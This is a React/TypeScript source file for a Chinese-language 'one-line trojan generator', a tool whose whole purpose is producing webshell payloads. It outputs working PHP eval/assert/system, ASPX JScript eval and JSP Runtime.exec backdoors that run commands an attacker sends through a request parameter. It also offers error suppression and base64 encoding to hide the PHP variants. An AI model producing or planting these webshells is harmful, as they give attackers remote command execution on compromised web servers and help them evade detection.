import {
    Stack,
    Select,
    TextInput,
    Textarea,
    Paper,
    Group,
    Switch, Title, Text,
} from '@mantine/core';
import { useState, useEffect } from 'react';
import {handleAppError} from "../../utils/error.ts";

// 模板函数：根据参数动态生成 payload
const generatePayload = ({
                             type,
                             password = 'cmd',
                             useAtSign = true,
                             encode = false,
                         }: {
    type: string;
    password?: string;
    useAtSign?: boolean;
    encode?: boolean;
}): string => {
    const at = useAtSign ? '@' : '';
    let code = '';

    try {
        switch (type) {
            case 'php_eval':
                code = `<?php ${at}eval($_POST['${password}']); ?>`;
                break;
            case 'php_assert':
                code = `<?php ${at}assert($_POST['${password}']); ?>`;
                break;
            case 'php_system':
                code = `<?php if(isset($_POST['${password}'])){ ${at}system($_POST['${password}']); } ?>`;
                break;
            case 'aspx':
                code = `<%@ Page Language="Jscript"%><%${at}eval(Request.Item["${password}"],"unsafe");%>`;
                break;
            case 'jsp':
                code = `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("${password}")).getInputStream();
int a = -1; byte[] b = new byte[2048];
while((a=in.read(b))!=-1){ out.println(new String(b)); } %>`;
                break;
            default:
                throw '错误类型';
        }
    }
    catch (error) {
        handleAppError(error, {
            autoReload: true,
            reloadDelay: 1000,
            title: '一句话木马生成器'
        })
    }


    if (encode && type.startsWith('php')) {
        // 简单 base64 编码示例
        const b64 = btoa(code.replace('<?php ', '').replace(' ?>', ''));
        return `<?php ${at}eval(base64_decode('${b64}')); ?>`;
    }

    return code;
};

export default function PayloadGenerator() {
    const [type, setType] = useState<string | null>('php_eval');
    const [password, setPassword] = useState('cmd');
    const [useAtSign, setUseAtSign] = useState(true);
    const [encode, setEncode] = useState(false);
    const [payload, setPayload] = useState('');

    useEffect(() => {
        if (type) {
            const result = generatePayload({ type, password, useAtSign, encode });
            setPayload(result);
        }
    }, [type, password, useAtSign, encode]);

    return (
        <Paper p="md" withBorder>
            <Group justify="space-between" align="flex-end">
                <div>
                    <Title order={3}>一句话木马生成器</Title>
                    <Text size="sm" c="dimmed" mt={4}>
                        生成简单一句话木马
                    </Text>
                </div>

            </Group>
            <br/>
            <Stack>
                <Select
                    label="木马类型"
                    placeholder="选择类型"
                    value={type}
                    onChange={(val) => setType(val)}
                    data={[
                        { value: 'php_eval', label: 'PHP (eval)' },
                        { value: 'php_assert', label: 'PHP (assert)' },
                        { value: 'php_system', label: 'PHP (system + 条件判断)' },
                        { value: 'aspx', label: 'ASPX (JScript)' },
                        { value: 'jsp', label: 'JSP (Runtime.exec)' },
                    ]}
                />

                <TextInput
                    label="密码参数名"
                    placeholder="默认: cmd"
                    value={password}
                    onChange={(e) => setPassword(e.currentTarget.value.trim() || 'cmd')}
                />

                <Group justify="space-between" grow>
                    <Switch
                        label="使用 @ 抑制错误"
                        checked={useAtSign}
                        onChange={(e) => setUseAtSign(e.currentTarget.checked)}
                    />
                    <Switch
                        label="Base64 编码（仅 PHP）"
                        checked={encode}
                        onChange={(e) => setEncode(e.currentTarget.checked)}
                        disabled={!type?.startsWith('php')}
                    />
                </Group>

                <Textarea
                    label="生成的 Payload"
                    value={payload}
                    readOnly
                    minRows={4}
                    autosize
                    styles={{ input: { fontFamily: 'monospace' } }}
                />
            </Stack>
        </Paper>
    );
}